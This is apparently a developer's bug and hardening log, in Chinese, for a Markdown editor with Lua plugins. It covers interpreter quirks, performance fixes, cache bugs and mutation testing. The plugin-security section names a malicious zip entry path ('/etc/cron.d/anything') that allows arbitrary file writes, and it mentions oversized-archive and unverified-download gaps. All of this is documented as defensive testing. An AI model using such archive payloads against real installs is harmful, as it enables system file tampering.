没有下一批了，被留下的标题就是永远不会发出的标题。分成 `flush` 和 `flush_last` 两个。

### 涉及文件

插件仓库 `lib/blocks.lua`；主应用 `test/services/ai_translate_plugin_test.dart`

---

## BUG-310：lua_dardo 里嵌套函数中的裸 `return` 是空操作

**这条是这一版最重要的发现，而且不是找出来的——是撞上的。**

### 怎么撞上的

修 BUG-309 时加了一条守卫：整批都是标题时不切分，否则会送出一条空请求。
写完跑测试，**空请求还在**。

推演了三遍代码都得出"应该正确"的结论，于是停止猜测，直接把 `blocks.lua` 用
`PluginScriptRuntime` 跑起来打印分批结果——`n=2 [1 len=0] [2 len=2013]`。
守卫的 `return` 根本没有生效。

### 最小复现

```lua
local out = {}
local function f()
  if true then return end
  out[#out + 1] = "x"     -- 这一行照样执行
end
f()
-- #out == 1
```

逐项缩小后的确切规则：

| 形式 | 行为 |
|---|---|
| 嵌套函数里 `if ... then return end` | **被忽略**，后面的语句照常执行 |
| 嵌套函数里 `for ... do return end` | **被忽略** |
| 嵌套函数里 `while true do return end` | **死循环**——探针测试直接超时 |
| 嵌套函数里 `return nil` | 正确 |
| `on_command` 顶层 `return <值>` | 正确 |

条件为真为假都一样：裸 `return` 就是一条什么都不做的语句。

### 为什么之前没暴露

`blocks.lua` 里本来就有三处 `if #current == 0 then return end`，全都是无效的。
它们**碰巧**没出事：

- `split` 的 flush 后面还有一道 `empty` 检查，空批次被它挡住了
- `batch` 的 flush 只在 `size > 0` 时被调用，而 `size > 0` 蕴含 current 非空

**我新加的那条守卫是第一处真正依赖提前返回的代码。**

### 严重性

`if not ok then return end` 是每个 Lua 程序员写守卫的方式。在这个解释器里它什么也守不住：
校验通过了、空值情况"处理"了，而处理并没有发生。**在 `while true` 里它是死循环**，
读者看到的是编辑器卡死——这和 BUG-294 是同一种表现，但成因完全不同，
而且是一段看起来完全正常的代码造成的。

### 修

三个仓库全扫了一遍，只有 `blocks.lua` 有这个形式，四处，全部改成 `return nil`
（合法 Lua，上游哪天修好了也照样对）。

### 两条测试

- **钉住解释器的行为**，而且是**断言它坏掉**：那条测试哪天失败了，就是上游修好了、
  可以拿掉绕法的那天
- **扫本项目所有 `.lua`**（主应用 test/、SDK、官方插件），禁止裸 `return`

第二条第一版写错了：它读相邻仓库却没有 `skip:`，在没有插件仓库的 CI 上会**失败**
而不是跳过。被既有守卫 `repo_dependent_tests_test` 当场抓住——那条守卫正是为
「本地全绿 CI 全红」写的，这次轮到它抓我。

### 文档

写进了 SDK README 的「What this Lua does not do」表——它原本有四条，现在五条，
而这一条单独配了三段说明，因为前四条是"某个写法没用"，这一条是"你写的守卫不守"。
12 种语言全部跟上。

### 涉及文件

插件仓库 `lib/blocks.lua`；SDK 的 `README.md` 与 11 份翻译；
主应用 `test/services/lua_bare_return_test.dart`（新增）

---

## BUG-311：大文档只按行数分段，一行是多长完全不管

### 现象

任务清单第 1 条是「秒启动、加载快、支持大文件」。`safePrefix` 是保证这一条的机制：
大文档先解析开头一段画出来，其余的交给另一个 isolate。

它按**行数**判断（1500 行），不看字节。实测：

| 文档 | 行数 | `safePrefix` | 首帧解析 |
|---|---|---|---|
| 1.0MB | 799 | **null（整篇）** | 496ms |
| 4.6MB | 1599 | 返回了，但**长 4,506,654 字符** | 2141ms |
| 8.6MB | 1199 | **null（整篇）** | **3999ms** |

中间那一行是最容易看漏的：它**返回了前缀**，所以一切看起来正常——而切点落在
1599 行里的第 1500 行，"开头一段"就是几乎整篇，2141ms 一毫秒也没省下。

什么文档会行少字节多？**不硬换行的散文**（一段就是一行，很常见）、粘进来的日志、
base64 块、宽表格。

### 修

触发条件和切点条件**都**加上字节维度：

```dart
if (lines.length <= minimumLines && source.length <= minimumCharacters) return null;
...
final enough = i >= minimumLines || consumed >= minimumCharacters;
```

`minimumCharacters` 取 200KB。这个数是有理由的：1500 行普通散文（每行 80 字符）
约 120KB，**在预算之下**——所以正常换行的文档切在和以前完全一样的地方，
只有长行的形状会变。

`consumed` 在循环**最开头**累加，在所有 `continue` 之前：围栏里的行和段落里的行
一样要解析，算在后面的话，一份以大代码块开头的文档会一分钱预算都不花地穿过去。

### 效果

| 文档 | 修复前首帧 | 修复后首帧 |
|---|---|---|
| 1.0MB / 799 行 | 496ms | **123ms** |
| 4.6MB / 1599 行 | 2141ms | **104ms** |
| 8.6MB / 1199 行 | **3999ms** | **94ms** |
| 0.3MB / 11999 行（普通散文） | 按行数切 | 31ms（未受影响）|

8.6MB 那一行是 **42 倍**。

### 变异

1. 触发条件回到只看行数 → 「a document can be too large without being too many
   lines」失败
2. 切点条件回到只看行数 → 上面那条加「the prefix is bounded in size」两条失败
3. `consumed` 挪到 `continue` 之后 → 「a huge fenced block counts toward the
   budget」失败

**第 3 次第一遍没打掉任何测试。** 我那条围栏测试用了 2000 行短代码，围栏本身就越过了
1500 行阈值，切分因行数发生，两种实现都通过。改成 100 行 × 5000 字符（行数不越线、
字节越线）之后才真正区分开——又一次「断言要能区分假设」。

### 涉及文件

`lib/services/markdown_parser.dart`；`test/services/safe_prefix_test.dart`

---

## BUG-312：状态栏的字数在 UI 线程上统计

### 现象

`countWords` 已经优化过一轮——单趟、无正则、无拷贝，注释里记着它替换掉的那版
「一兆 280ms」。但它仍然跑在**画窗口的那个 isolate 上**，防抖 300ms。

实测：8.6MB 文档 **176ms**。而字数是**常显**的（状态栏里没有开关）。

所以在大文档里，**每次停下打字就卡一下**——而停下打字正是人在看屏幕的时候。

### 修

`countWordsOffThread`：超过 512KB 走 `Isolate.run`，否则原地算；spawn 失败就退回原地。
这是解析器已经在用的形状。

阈值和收益都是量出来的，不是估的：

| 文档 | 本线程 | isolate 端到端 |
|---|---|---|
| 0.2MB | 14ms | 14ms |
| 1MB | 27ms | — |
| 8.6MB | 176ms | 124ms |

端到端时间几乎一样，说明**把字符串递过去的开销可以忽略**，那 176ms 是 UI 线程净赚的。
512KB 以下是个位数毫秒，此时 isolate 才是这笔操作里更贵的那一半。

### 异步化开出了一个新窗口

同步时不存在的问题：**计数回来时，它描述的那份文档可能已经不在了**。
状态栏显示上一份文档的数字，比显示得晚更糟——因为看起来一点问题都没有。

加了一道判断：结果回来时若 `content != _lastContent` 就丢弃。

### 这条测试我写坏了一次

第一版用「1.5MB 文档 + 真实计时」来制造那个窗口。**变异（去掉那道判断）没有打掉它**——
1.5MB 只要 30ms，远早于后一份文档 300ms 的防抖就完成了，写不写回都会被覆盖。

要让旧计数真的比新计数晚完成，文档得大到计数超过 300ms——实测约 **24MB**。
但那样的测试**在更快的机器上窗口会自己关上，测试静默地变成什么也没证明**，
这是最难察觉的一种绿。

改成把 service 做成可注入，用一个受控的 `Completer` 精确制造那个顺序：
变异后断言拿到 `999` 而不是 `3`。确定性，不依赖任何机器的速度。

按记忆里那条规矩（时序相关的改动要连跑五次），还原后连跑五次全过。

### 涉及文件

`lib/services/word_count_service.dart`；`lib/providers/word_count_provider.dart`；
`test/services/word_count_service_test.dart`；
`test/providers/word_count_off_thread_test.dart`（新增）

---

## BUG-313：修了字数，把它注释里点名的兄弟留在了原地

### 现象

`outline_provider.dart` 的类注释，原文：

> Debounced the way the word count already was, **since it is the same shape of
> problem**.

上一轮（BUG-312）把字数移出了 UI 线程。大纲留在原地——**同样防抖 300ms，同样同步，
同样跑在画窗口的那个 isolate 上**。

实测 4.7MB / 16 万行：**184ms**，和字数的 176ms 同一量级。

这是「改一个分支就读完它的兄弟」最赤裸的一次：**兄弟的名字就写在被改那一份的注释里**，
而我上一轮没有回头看它。

### 修

和 BUG-312 同形：`Isolate.run`，spawn 失败退回原地算，加一道陈旧结果不写回的判断。

大纲的陈旧结果比字数更糟：**标题看起来都是对的，而每个行号都是错的**——
而行号正是点击一条大纲要跳过去的东西。

### 一处**不**照抄的地方：没有字节阈值

字数的代价跟文档**重量**走，所以字节是对的代理。大纲的代价跟文档**行数**走：

| 文档 | 大纲耗时 |
|---|---|
| 8.8MB / 900 行（长行） | 46ms |
| 1.1MB / 16 万行（短行） | 216ms |

**字节阈值在这里是"用便宜的方式问了错的问题"**——正是 BUG-311 犯过的错。
而正确的代理（数行数）自己就要扫一遍，成本高于实测 **0.4–1.1ms** 的 spawn。
所以这里不设阈值，理由写在类注释里。

### 我测量时也差点栽在同一件事上

第一次量大纲，我用的是 BUG-311 那份「行少字节多」的 8.8MB 文档，得出 **46ms**，
和注释里写的 402ms 差了一个量级，一度以为注释过时了。
换成正常行长的散文才看到 184ms。**同一天里，"文档的形状比大小重要"这件事教了我两次。**

（注释里的 402ms 我没复现出来，最高量到 184ms。可能是机器不同或代码改过；
这里记的是我自己量到的数。）

### 变异

1. 改回同步、留在 UI 线程 → 陈旧判断那条失败
2. 去掉陈旧判断 → 同一条失败

**第 1 次变异没有打掉守卫**，因为我只改了调用行，`Isolate.run` 字样还留在文件里，
而守卫查的是**字符串存在**而不是它被用上。加严成三条断言（有 `Isolate.run`、
没有 `state = MarkdownParser.headingOutline`、有 `await _compute(`）之后，
同一次变异两条测试同时失败。

还原后连跑五次全过。

### 涉及文件

`lib/providers/outline_provider.dart`；`test/providers/outline_off_thread_test.dart`（新增）

---

## BUG-314：「重新加载图片」什么也不做

### 现象

菜单里有「重新加载图片」，快捷键 F5，`editorProvider.reloadImages()` 会把
`imageRevision` 加一。渲染器也确实在图片分支里 `ref.watch` 了它，还把它编进了
图片控件的 key。

**但按下去什么都不会发生。**

探针（`Image` 控件的 key，前后对比）：

```
PROBE 之前   key = [<'image:0:http://elsewhere/a.png'>]
PROBE F5 之后 key = [<'image:0:http://elsewhere/a.png'>]   变了吗=false
```

### 根因

`build` 里有一层块级缓存：`_blockWidgets.putIfAbsent(node, draw)`，
只在 `signature` 变化时清空。而 `signature` 是这么写的：

```dart
final signature = (nodes, config.themeName, config.fontSize, ...);
```

**没有 `imageRevision`。** 所以重载之后块从缓存里原样取出，`draw()` 不执行，
`_buildImageSpan` 不执行，那个 `ref.watch` 和那个 key 都碰不到。

这是「写好了没接上」的一个变种：**接上了，但接在一条不会被执行的路径上**。
图片分支里的 watch 和 key 写得都对，只是外面有一层缓存把它们隔在了后面。

### 修

`imageRevision` 进签名。一行。

### 怎么撞上的

不是找 F5 找到的。修 BUG-315（下一条）时写了一条「重载之后要重新取图」的测试，
它失败了——我先以为是自己刚改的缓存写坏了，查下去才发现是更早就存在的问题，
而且**文档路径和插件路径一起坏**。

### 涉及文件

`lib/ui/editor/markdown_renderer.dart`；`test/ui/editor/plugin_picture_cache_test.dart`（新增）

---

## BUG-315：图片缓存每次重载滞留一整代

### 现象

BUG-307 给渲染器加了 `_loadedPictures`，键是 `'$revision:$href'`——把代号编进键，
这样「重新加载图片」时键会变、会重新取。

**代价是旧的那一代永远不释放。** 每条目握着一张图片的字节，上限 8MB
（`PluginImageLoader.maxBytes`）。按十次 F5，就是十代同时留在内存里。

这是我自己今天上午写的代码，而「占用低」是这个项目的立身特性之一。

### 修

**清空，而不是编进键**：代号变了就 `clear()`，键只用地址。行为完全相同，没有堆积。

### 这个性质本来是测不出来的

第一次变异（改回按代号编键）**没有打掉任何测试**——两种实现从外部看完全一样：
都会重新取，都画出同样的东西。**差别只在事后还握着什么。**

所以把缓存提成一个具名的小类 `PictureCache`，暴露一个 `length`。
测试于是能问出那个唯一的区别：

```dart
for (var revision = 2; revision < 12; revision++) {
  await cache.fetch(revision, 'a.png', nothing);
}
expect(cache.length, 1, reason: '十次重载之后仍然只握着当前这一张');
```

重做变异，这条失败。**一个只能通过"还剩多少"观察的性质，就得有一个能问出"还剩多少"的接口。**

### 涉及文件

`lib/ui/editor/markdown_renderer.dart`；`test/ui/editor/plugin_picture_cache_test.dart`

---

## BUG-316：改代码字体，预览不跟着变

### 起点：上一条修完之后该问的问题

BUG-314 的根因是块缓存的签名漏了 `imageRevision`。**一张手写的清单漏了一项，
就必然还漏别的。** 所以直接对账：渲染器实际读了哪些配置项，签名里列了哪些。

```
签名里：themeName fontSize lineHeight wrapCodeBlocks codeBlockLineNumbers enableHtml
读到的：codeBlockLineNumbers codeFontFamily codeFontSize editMode
        editorMaxWidth enableHtml fontSize lineHeight themeName wrapCodeBlocks
```

差集四个，其中 `editorMaxWidth` 在外层 `ConstrainedBox` 里（不进缓存），
剩下三个都在被缓存的块里。

### 证实

```
PROBE 改之前 = 14.0
PROBE 改之后 = 14.0  （期望 24）
```

在设置里把代码字号改成 24，预览里的代码块**还是 14**。`_codeStyle()` 用的是
`ref.read`，连依赖都不注册；而它所在的块从缓存里原样取出，那行代码根本不执行。

`editMode` 同理——`_buildTable` 在分屏和预览模式下布局不同，而那个 `ref.watch`
同样在缓存后面。

### 修

三个字段进签名。

### 两条测试，一条查清单一条查行为

- **对账守卫**：扫渲染器里所有 `config.X` 与 `ref.read/watch(settingsProvider).X`，
  要求每个都在签名里，除非列进 `exempt` 并写明理由（目前只有 `editorMaxWidth`）。
  这条守卫独立地点出了同样三个名字
- **行为测试**：真的改设置、真的看预览里画出来的字号

两条都要有。**守卫查的是源码形状，清单可以是对的而机制仍然坏的**；
行为测试查的是那件事本身，但它只覆盖一个字段。

### 写探针时踩的两个坑

`pumpAndSettle()` 在这个渲染器上**永远不会返回**——它靠 post-frame 回调分批填充，
永远不静止。改成固定次数的 `pump`。

`await updateConfig(...)` 在 `testWidgets` 里**永远不完成**——它 await 的是写盘，
而 widget 测试跑在 FakeAsync 区里，`dart:io` 的 future 不会完成。
`state` 是同步改的，所以 `unawaited` 就行。这条记忆里本来就有，我又踩了一次。

两次都表现为「测试被 SIGTERM 杀掉、输出 0 字节」，看起来像环境问题而不像我的错。

### 涉及文件

`lib/ui/editor/markdown_renderer.dart`；
`test/ui/editor/block_cache_signature_test.dart`（新增）；
`test/ui/editor/code_font_updates_preview_test.dart`（新增）

---

## BUG-317：四种图表改了数据不会重绘

### 顺着同一个形状问下去

BUG-314 和 BUG-316 都是「手写清单漏项」。**还有哪些手写清单？**
`==` / `hashCode` 就是最典型的一种——漏一个字段，变化就看不见。

每一个 mermaid 画板的 `shouldRepaint` 都写成：

```dart
bool shouldRepaint(covariant XYChartPainter oldDelegate) =>
    oldDelegate.xyData != xyData || ...;
```

**所以每个模型的 `==` 都必须深到能看见数据变化。** 对账下来，四个不是：

| 模型 | `==` 里没有的集合 |
|---|---|
| `XYChartData` | `series`、`xAxisCategories` |
| `RadarChartData` / `RadarCurve` | `axes`、`curves` / `values` |
| `KanbanChartData` / `Column` / `Task` | `columns` / `tasks` / `metadata` |
| `QuadrantChartData` | `points` |

探针一次证实四个：

```
PROBE xychart  数据不同却相等 = true
PROBE radar    数据不同却相等 = true
PROBE kanban   数据不同却相等 = true
PROBE quadrant 数据不同却相等 = true
```

**改一个 kanban 卡片的文字、改一组柱状图的数字，标题不变的话，画面不动。**
文档说一件事，图说另一件，两边都不报错。

### 顺带发现：同一个函数写了七遍

修法要用列表逐元素比较（Dart 里 `List == List` 是同一性比较）。而这个函数
**在 models 目录下已经有七份私有副本**，四个不同的名字：

```
block_diagram.dart:_sameList   sankey.dart:_listEquals   packet.dart:_sameFields
sequence.dart:_sameList ×3     c4_diagram.dart:_sameList
```

它们目前还没分歧——**但没有任何东西阻止它们分歧**，而我正要加第五处用途。
收敛成 `models/list_equality.dart` 里的一个 `sameList`，七份删掉。

模型层只依赖 `dart:math` / `dart:ui`，不引 Flutter，所以没有用
`package:flutter/foundation` 的 `listEquals`——那看起来是刻意的约定。

### 守卫

`diagram_data_equality_test` 里的最后一条：扫 models 目录下每个带 `==` 的类，
要求它的每个 `List`/`Map`/`Set` 字段都出现在 `==` 里，例外要具名登记。
第五个模型漂移不进来。

### 变异

1. `XYChartData` 的 `series` 退出 `==` → 2 条失败（xy 那条 + 守卫）
2. `KanbanColumn` 的 `tasks` 退出 `==` → 2 条失败
3. `sameList` 的长度检查失效 → **1 条**失败

第 3 次只失败一条是**对的**：它只绕过长度检查，而元素循环仍然在跑，
我的测试里只有一对数据长度不同（`[1,2]` vs `[1,2,3]`）。

### 涉及文件

`lib/ui/editor/mermaid/models/list_equality.dart`（新增）；
`xy_chart.dart`、`radar.dart`、`kanban.dart`、`quadrant_chart.dart`；
`sankey.dart`、`block_diagram.dart`、`packet.dart`、`sequence.dart`、`c4_diagram.dart`（去重）；
`test/ui/editor/mermaid/diagram_data_equality_test.dart`（新增）

---

## BUG-318：`XYChartSeries` 相等而哈希不同

```dart
bool operator ==(Object other) => other is XYChartSeries && other.type == type;
int get hashCode => Object.hash(type, values.length);
```

`==` 只看 `type`，`hashCode` 还用了 `values.length`。**两个「相等」的对象可以有
不同的哈希值**，这违反 Dart 的 hash 契约——放进 `Set` 或当 `Map` 键时，
它们会落进不同的桶，去重和查找都会给出不合逻辑的结果。

```
PROBE series 相等=true  hash 相同=false
```

随 BUG-317 一并修好（`==` 现在也比 `values`，`hashCode` 用 `Object.hashAll`）。
单独编号是因为它是另一类错误：BUG-317 是「看不见变化」，这一条是
**「两个自洽性之间互相矛盾」**，即使 `==` 的深度是有意为之，这里也仍然是错的。

### 涉及文件

`lib/ui/editor/mermaid/models/xy_chart.dart`；
`test/ui/editor/mermaid/diagram_data_equality_test.dart`

---

## 加固：配置写得进去、读不回来，是没有任何东西会报错的一类失败

不是缺陷记录——**这次对账没发现问题**，`AppConfig` 的 51 个字段在
`toJson` / `fromJson` / `copyWith` 三处都是全覆盖。写下来是因为这里原本没有守卫，
而这一类失败的表现是「读者改了一项设置，明天它自己变回去了」，两边都不报错。

### 为什么值得单独加一条

既有的 `app_config_test` 有十条，逐个字段抽查——代码字号往返、类型写错时不丢别的字段、
小数写成整数仍然是数。**但没有一条对账全部 51 个。** 加第 52 个字段却忘了写进
`toJson`，现有十条会全部通过。

### 两条测试，各管一半

**键的对账**：`toJson` 的键从**运行它**得到，`fromJson` 的键从源码里 `json['...']`
抽出，两个集合必须相等。写了没读 = 那项设置存不住；读了没写 = 拼错了或早就废弃。

**值的往返**：把每个字段都改离默认值，序列化再反序列化，逐键比对。

第二条不能被第一条替代：**源码扫描只看字段名出现**，`toJson` 写 `'codeFont'` 而
`fromJson` 读 `'code_font'`，两边都提到了 `codeFontFamily`，扫描通过而值丢了。

### 变异

| 变异 | 失败的测试 |
|---|---|
| 一个字段忘了写进 `toJson` | 键对账 |
| 写和读的键拼得不一样 | **两条都失败** |
| 键对得上但用错了解析函数 | 只有值往返 |

第三种是键对账**故意**看不见的——它证明两条测试不是重复的。

### 顺带查过、没问题的

`PluginManifest` 的 `toJson` / `fromJson` 键也是对得上的（`type`、`when`、`default`
是内嵌对象的键，属于扫描误报）。它只被测试调用，但那是往返验证的正当用途，
不是「写好了没接上」。

### 涉及文件

`test/core/config/config_round_trip_test.dart`（新增）

---

## BUG-319：列表里留一个空条目，后面的全被吞进去

### 现象

```
- foo        现在：<ul><li>foo</li><li><ul><li>bar</li></ul></li></ul>
-            应该：<ul><li>foo</li><li></li><li>bar</li></ul>
- bar
```

**每个空条目多嵌一层**——连续两个空条目就是三层。有序列表同样。

而 `- `（标记加一个空格）**也触发**，那正是编辑器自动续列表时留下的形状：
敲完一条按回车、还没想好写什么就往下走，就撞上了。不需要写任何奇怪的东西。

### 根因

`_buildListItems` 按「item 的**文本**起始列」决定嵌套：

```dart
while (openContentColumns.isNotEmpty && indent < openContentColumns.last) { pop }
depths.add(openContentColumns.length);
openContentColumns.add(_contentColumn(block.first));
```

`_ulRe` / `_olRe` 都要求标记后**必须有内容**，所以空条目匹配不上，
`_contentColumn` 走 `if (match == null) return 0`。而 0 低于任何真实缩进，
`0 < 0` 不成立，永远不出栈，下一条就成了它的孩子。

**那行 `return 0` 上方的注释已经写着**：

> a column of zero let the next line, whatever it was, be swallowed as content
> belonging to the item

作者为 `4. fourth`（无前导空格）修过这个坑，**没修 null 那一支**。同一个形状今天见了第四次。

### 修

空条目返回「文本本该开始的列」＝缩进 + 标记宽度 + 1。

### 找它的过程比修它更值得记

**这一轮换了个方法：把 `commonmark_spec_test` 的 155 个失败例子当成缺陷清单。**
那个测试的注释写着「raising the number is ordinary work」。

第一步先纠正了自己的测量：我写探针分组统计，报出 318 个失败，和真测试的 155 对不上——
因为我抄了一个简化版的 `normalise`。**真测试的注释正好警告过这件事**
（"anything measured another way is measuring another thing"）。
改成给真测试临时插桩才拿到真数字。

失败最多的是 Links（31 个）。我以为是维基百科那种带括号的链接——**一试是好的**，
一层括号没问题，失败的是两层，真实文档里罕见；链接标题也是好的。
**Links 这一簇基本是规范细节，不是用户可见缺陷。** 转去查列表才找到真东西。

### 修的时候被编译器拦了一次

我新写了个 `_emptyItemRe`——**已经有一个了**。改成给现成的那个加捕获组。
这一轮一直在讲「不要再抄一份」，自己差点又抄一份。

### 变异

1. 空条目回到返回 0 → **5 条**失败，包括 `commonmark_spec_test` 的棘轮
2. 宽度少加那个空格 → **一开始没打掉任何测试**

第 2 条说明那个 `+1` 无人证明。补的测试不写死数字，而是问**一致性**：
「空条目底下能挂什么，应该和有内容的条目一样」——用一个缩进 1 空格的子项把两者区分开。
重做变异，失败。

### 棘轮

CommonMark 分数 **493 → 495**，下限已按规矩提上去。

### 涉及文件

`lib/services/markdown_parser.dart`；`test/services/empty_list_item_test.dart`（新增）；
`test/services/commonmark_spec_test.dart`（下限）

---

## 审计：五次扫描没找到缺陷（2026-09-08）

不是缺陷记录。写下来是因为「查过哪里」对下一个人有用，而且这一轮的结论本身是有信息量的。

### 查了什么，都是好的

BUG-319 是从 CommonMark 的失败清单里挖出来的。同一条矿脉继续挖，但换了个问法——
**先测常见构造，而不是照着规范例子挨个修**（上一轮的教训是「失败最多的那一簇不一定
最值得修」）：

| 扫描 | 覆盖 | 结果 |
|---|---|---|
| 列表项里的构造 | 围栏代码、引用、第二段、表格、缩进代码、任务列表、图片 | 全对 |
| 每天碰的行内构造 | 硬换行两种、四种转义、实体、行内代码留白、Tab、引用里的列表/代码 | 全对 |
| 编辑器回车续列表 | 空条目上按回车要退出列表 | 对 |
| 搜索 | 12 例，含 CJK 整词、emoji 边界、非法正则、重叠、下划线相邻 | 全对 |
| 流程图解析 | 14 种语法：各种边、五种节点形状、子图、多目标、样式类、中文 id | 全对 |

### 一个没有变成缺陷的线索

按「哪些源文件完全没有测试触及」排了一遍，排在前面的是 mermaid 的四个解析器
（flowchart 760 行、sequence 647、gantt 512、class 484）。

**但「没有对应的测试文件」不等于「没被测到」**——它们经 `MermaidParser` 被间接跑过，
`every_type_draws_test` 和退化输入那一组都覆盖到了。真去测流程图的 14 种常见语法，
一个错都没有。

这条记下来是为了让下一个人不必重排一遍这个名单。

### 结论

**这一轮找不到，不等于没有。** 但五次扫描都落在"用户天天碰的路径"上，全部健康——
说明剩下的缺陷不在这些地方，下一轮该换更冷的角落，或者换成只能人工验的东西。

---

## 加固：换个问法——不是「有没有测试」，是「测试网拦不拦得住」

不是缺陷记录：`file_service.dart` 的生产代码全都是**对的**。但四条它明确写下来的行为，
**没有任何东西按住它们**——把代码改坏，2659 条测试全绿。

### 上一轮的结论把我带到这里

上一轮五次扫描全空，结论是「剩下的缺陷在更冷的角落」。这一轮先找冷角落：
`TODO`/`FIXME` 一个真的都没有；MCP、撤销重做都有测试。覆盖率这个角度问不出东西了。

**于是换问法：不看有没有测试，直接把代码改坏，看测试网响不响。**

target 选 `file_service.dart`，因为它出错的形式是**丢数据**。

### 四个变异，全部存活

| 变异 | 后果 |
|---|---|
| 换行符只替换 `\r\n`，漏掉孤立的 `\r` | 老 Mac 文件的换行全失效 |
| 变更检测只比大小，不比修改时间 | **别人改了等长的内容，编辑器静默覆盖掉** |
| 文件消失时判为「没变过」 | 删掉的文件被悄悄重建 |
| 无戳时判为「变过了」 | 文档永远存不了（这个坑以前踩过，记在 `hasChangedSince` 的注释里）|

第二个是最严重的：改一个等长的错字、格式化工具重写一遍、某个程序改一个定长字段——
**大小不变的外部修改非常常见**，而只比大小的检测看不见它。

第一个先只在文件服务那批测试上跑，全绿；**又用整个 2659 条跑了一遍，还是全绿**。
确认缺口是真的，才动手写测试。

### 四条测试，四个变异，一一对应

写完逐个变异复验：A→换行那条、B→等长修改那条、C→文件消失那条、D→无戳那条。
没有一条是顺带被别的测试抓住的。

### 这个方法值得记下来

**覆盖率回答的是"看过没有"，变异回答的是"拦得住吗"。** 这一轮前半程用覆盖率的问法
（谁没测试、有没有 TODO）什么也没问出来，换成变异的问法，十分钟出四个。

### 涉及文件

`test/services/disk_stamp_test.dart`（新增）

---

## 加固：插件安装的两道安全检查没人按着

不是缺陷记录：`plugin_manager.dart` 的代码是**对的**。但把它改坏，2665 条测试全绿。

### 承接上一轮的方法

上一轮用变异的问法在 `file_service.dart` 上找到四个缺口。这一轮换下一个
「出错代价最大」的文件——插件安装，出错就是**恶意插件进来**。

五道检查各变异一次：

| 变异 | 结果 |
|---|---|
| 整条路径穿越检查去掉 | 被抓 |
| **只查 `../`，不查绝对路径** | **存活** |
| **压缩包体积上限去掉** | **存活** |
| 条目数上限去掉 | 被抓 |
| 声明尺寸上限去掉 | 被抓 |

### 存活的两个，各是什么后果

**绝对路径。** 既有测试只造了 `../escape.txt`。而 `p.join` 遇到绝对的第二段
**会丢弃基准目录**——一个名叫 `/etc/cron.d/anything` 的条目不会写进插件目录，
它写到它自己说的地方。这是任意文件写入。

**体积上限。** 检查发生在 `readAsBytes` **之前**，注释里写着「Before reading it
into memory, which is where an oversized archive would do its damage」。
去掉它，一个 10GB 的 ZIP 会先被整个读进内存。

### 一个差点写出来的、分不清情况的断言

体积上限去掉之后，`decodeBytes` 面对 65MB 的零字节**也会抛 `FormatException`**——
只断言「抛了 FormatException」两种实现都通过。所以断言的是**消息里有没有
"the limit is"**。

测试用**稀疏文件**造 65MB：`setPosition` 到位再写一个字节，不占磁盘也不花时间，
而 `length()` 报的是完整大小——这正是被检查的那个值。

### 一处已知且已记录的空白，不动

解压后的**实际**字节数还有第二道检查，它的上方写着自己没有测试，
理由是要生成超过 256MB 才测得了。那条注释是诚实的，保留原样。

### 涉及文件

`test/services/plugin_zip_bounds_test.dart`（新增）

---

## BUG-320：插件下载只强制了一半的 https

### 现象

长期要求是「插件市场的下载必须走 HTTPS 并校验 SHA-256」。registry 那一端确实检查了：

```dart
if (!registryUrl.isScheme('https')) { ... }
```

**但每个插件的下载地址没有。** 它来自 registry 应答里的 JSON：

```dart
downloadUrl: Uri.parse(browserUrl),   // asset['browser_download_url']，原样
```

正常情况下 GitHub 给的是 https。但代码并没有保证被要求的那件事——
**两条规则，只有一条覆盖了两端**。

### 顺带查出来的：三道检查全都无人守

这一轮继续用变异的问法，target 是「出错＝被篡改的插件装进来」的
`plugin_catalog_service.dart`：

| 变异 | 结果 |
|---|---|
| SHA-256 校验去掉 | **存活**（2665 条全绿）|
| registry 的 https 检查去掉 | 存活 |
| HTTP 状态码检查去掉 | 存活 |

原因是**结构性的**：`install()` 自己建 `HttpClient` 做真网络 I/O，没有测试够得到它。

### 修：把规则从 I/O 里分出来

`refuseInsecureDownload(Uri)` 和 `digestMatches(bytes, expected)` 两个具名静态函数，
`install()` 调用它们。**传输本身仍然没有测试；它被要求执行的规则现在有了。**

摘要比较保持**大小写敏感**。十六进制摘要按定义是大小写无关的，所以这比必要的更严——
而这是该犯错的那一边：大小写不同只会拒绝一个真文件（吵闹、可逆、不丢数据），
永远不会放过一个被篡改的。这条写进了注释，也写成了一条测试。

### 变异验证暴露了单元测试的盲区

三次变异：放行 http → 2 条失败；摘要恒真 → 3 条失败；**`install()` 里删掉那行调用
→ 全过**。

第三种正是本仓库出现过七次的「写好了没接上」，而**单元测试原理上看不见它**。
补了一条接线守卫，扫 `install()` 的函数体，要求两条规则都被调用。重做变异，失败。

### 涉及文件

`lib/services/plugin_catalog_service.dart`；
`test/services/plugin_download_rules_test.dart`（新增）

---

## BUG-321：跑不了的插件照样装上，用的时候才说

### 现象

一个只提供 `macos-arm64` / `windows-x64` 构建的编译插件，在 Linux 上**安装成功**、
出现在列表里，直到读者点它才收到「has no build for linux-x64」。

**装完才发现跑不起来，比装的时候就说清楚差得远。**

### 这是 `minAppVersion` 那个故事的第二遍

`plugin_compatibility_test` 的注释原文：

> `minAppVersion` was parsed, stored and written back out, and **checked nowhere**.
> A plugin declaring 1.7.0 installed and ran on 1.6.1 …

平台就停在那个状态：`supportsPlatform` **写好了、测过了、没有任何地方问它**。
UI 里也完全没有平台兼容性的概念。

### 修

安装时的检查放在 `minAppVersion` 那道旁边，直接用现成的 `supportsPlatform`——
不是再写一份判断。脚本插件答 true，这是对的：Lua 插件编辑器能跑的地方它都能跑。

### 怎么找到的

上一轮的教训是「单元测试看不见没接上」。这一轮把这个问题**系统地问了一遍全库**：
扫 `lib/` 里声明了但只出现一次（即只有定义）的公开函数，18 个嫌疑，逐个进文件确认。

记忆里记着这个扫描的三个坑，这次又添了第四个：

| 坑 | 例子 |
|---|---|
| 同类内调用不带前缀 | — |
| tear-off 没有括号 | — |
| 名字当变量传 | — |
| **公开包装 + 私有实现** | `isNewer` 是 `@visibleForTesting` 的壳，真正被调的是 `_isNewer` |

18 个里绝大多数是合法的（测试缝、框架回调、私有实现的壳），真问题两个。

---

## BUG-322：`entrypointPath` 是携带错规则的死代码

零调用、零测试，而它写的是：

```dart
manifest.entrypointFor(currentPlatform) ?? manifest.entrypoint
```

对一个**没有本平台构建的编译插件**，`entrypointFor` 返回 null，它回退到通用入口——
而 `startPlugin` 对同一情况是明确拒绝的，理由写在它上方：

> A compiled plugin ships a real executable per platform, or it does not run
> on that platform at all.

**同一条规则的第三份实现，而且是唯一一份说错的。** 它没被调用，所以从没出过事；
留着它等于留一个将来会被人当成"现成的"去用的错误答案。删掉。

### 涉及文件

`lib/services/plugin_manager.dart`；`test/services/plugin_platform_refusal_test.dart`（新增）

---

